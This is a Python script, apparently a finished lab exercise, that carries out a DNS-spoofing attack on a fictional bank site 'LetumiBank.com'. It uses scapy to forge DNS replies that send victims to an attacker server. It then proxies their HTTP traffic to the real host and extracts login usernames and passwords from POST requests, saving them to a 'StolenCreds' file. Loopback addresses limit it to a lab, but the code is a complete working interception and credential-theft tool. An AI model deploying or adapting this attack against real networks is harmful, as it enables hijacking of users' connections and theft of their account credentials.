import os
import argparse
import socket
from scapy.all import *

conf.L3socket = L3RawSocket
WEB_PORT = 8000
HOSTNAME = "LetumiBank.com"


def resolve_hostname(hostname):
    # IP address of HOSTNAME. Used to forward tcp connection.
    # Normally obtained via DNS lookup.
    return "127.1.1.1"


def log_credentials(username, password):
    # Write stolen credentials out to file.
    # Do not change this.
    with open("lib/StolenCreds.txt", "wb") as fd:
        fd.write(str.encode("Stolen credentials: username=" + username + " password=" + password))


def check_credentials(client_data):
    header, content, other = client_data.split("\r\n\r\n")
    # If found, log the credentials to the system by calling log_credentials().
    if "username" in content and "password" in content:
        params = content.split("&")
        username = params[0].split("username='")[1][:-1]
        password = params[1].split("password='")[1][:-1]
        log_credentials(username, password)


def handle_tcp_forwarding(client_socket, client_ip, hostname):
    # Continuously intercept new connections from the client
    # and initiate a connection with the host in order to forward data
    BUFF_SIZE = 32768
    while True:
        connection, address = client_socket.accept()
        # create a new socket to connect to the actual host associated with hostname.
        leumit_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        leumit_socket.connect((resolve_hostname(hostname), WEB_PORT))
        data = connection.recv(BUFF_SIZE).decode()
        if "POST" in data:
            check_credentials(data)
        leumit_socket.send(data.encode())
        response = leumit_socket.recv(BUFF_SIZE)
        print(f"message received: {data}")
        print(f"response: {response.decode()}")
        connection.send(response)
        connection.close()

        # Check for POST to '/post_logout' and exit after that request has completed.
        if "POST" in data and "/post_logout" in data:
            break



def dns_callback(packet, server_ip, server_socket):
    # Sends a spoofed DNS response for a query to HOSTNAME and calls handle_tcp_forwarding() after successful spoof.
    target = packet[DNS].qd.qname.decode()
    if HOSTNAME in target:
        # Resolve dns query with attacker server ip
        response = IP(dst=packet[IP].src, src=packet[IP].dst) / UDP(sport=53, dport=packet[UDP].sport) / \
                   DNS(id=packet[DNS].id, qd=packet[DNSQR], qr=1, aa=1,
                       an=DNSRR(rdata=server_ip, rrname=packet[DNSQR].qname))
        send(response, iface='lo')
        handle_tcp_forwarding(server_socket, server_ip, HOSTNAME)


def sniff_and_spoof(source_ip):
    attacker_server = socket.socket()
    attacker_server.bind((source_ip, WEB_PORT))
    attacker_server.listen()

    # This socket will be used to accept connections from victimized clients.
    # and the socket you created as extra callback arguments.
    sniff(prn=lambda org_arg: dns_callback(org_arg, source_ip, attacker_server), filter="port 53", iface='lo')


def main():
    parser = argparse.ArgumentParser(description='Attacker who spoofs dns packet and hijacks connection')
    parser.add_argument('--source_ip', nargs='?', const=1, default="127.0.0.3", help='ip of the attacker')
    args = parser.parse_args()

    sniff_and_spoof(args.source_ip)


if __name__ == "__main__":
    # Change working directory to script's dir.
    # Do not change this.
    abspath = os.path.abspath(__file__)
    dirname = os.path.dirname(abspath)
    os.chdir(dirname)
    main()
